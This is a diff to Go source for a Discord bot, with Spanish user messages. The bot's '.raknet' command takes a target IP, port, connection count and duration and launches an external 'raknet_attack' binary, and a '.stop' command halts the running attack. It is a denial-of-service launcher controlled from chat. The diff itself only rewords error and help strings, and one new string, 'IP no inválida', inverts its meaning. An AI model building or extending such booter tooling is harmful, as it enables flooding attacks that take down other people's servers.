@@ -75,7 +75,7 @@ func handleRaknetCommand(s *discordgo.Session, m *discordgo.MessageCreate, args 
 	}
 
 	if len(args) < 4 {
-		s.ChannelMessageSend(m.ChannelID, "Ponga bien la ip, port, conexions(10000), tiempo`")
+		s.ChannelMessageSend(m.ChannelID, "`.raknet <ip> <puerto> <conexiones> <segundos>`")
 		return
 	}
 
@@ -84,9 +84,8 @@ func handleRaknetCommand(s *discordgo.Session, m *discordgo.MessageCreate, args 
 	connections := args[2]
 	timeSeconds := args[3]
 
-	// Validar parámetros
 	if !isValidIP(ip) {
-		s.ChannelMessageSend(m.ChannelID, "IP no valida")
+		s.ChannelMessageSend(m.ChannelID, "IP no inválida")
 		return
 	}
 
@@ -96,16 +95,15 @@ func handleRaknetCommand(s *discordgo.Session, m *discordgo.MessageCreate, args 
 	}
 
 	if !isValidNumber(connections) {
-		s.ChannelMessageSend(m.ChannelID, "Conexiones no valido")
+		s.ChannelMessageSend(m.ChannelID, "Número de conexiones no valido")
 		return
 	}
 
 	if !isValidNumber(timeSeconds) {
-		s.ChannelMessageSend(m.ChannelID, "Tiempo no valido")
+		s.ChannelMessageSend(m.ChannelID, "Segundos no valido")
 		return
 	}
 
-	// Ejecutar el script RakNet
 	go func() {
 		cmd := exec.Command("./raknet_attack", ip, port, connections, timeSeconds)
 		
@@ -142,7 +140,7 @@ func handleStopCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
 	defer processMutex.Unlock()
 
 	if !isRunning || attackProcess == nil {
-		s.ChannelMessageSend(m.ChannelID, "No hay un ataque en run")
+		s.ChannelMessageSend(m.ChannelID, "No hay ataque run")
 		return
 	}
 
@@ -159,8 +157,8 @@ func handleStopCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 func handleHelpCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
 	helpMsg := "**Comandos disponibles:**\n" +
-		".raknet <ip> <puerto> <conexiones(10000)> <segundos>\n" +
-		".stop - Detiene los atques\n" +
+		".raknet <ip> <puerto> <conexiones> <segundos>\n" +
+		".stop - Detiene los ataques\n" +
 		".help - Muestra esta ayuda\n\n" +
 
 	s.ChannelMessageSend(m.ChannelID, helpMsg)
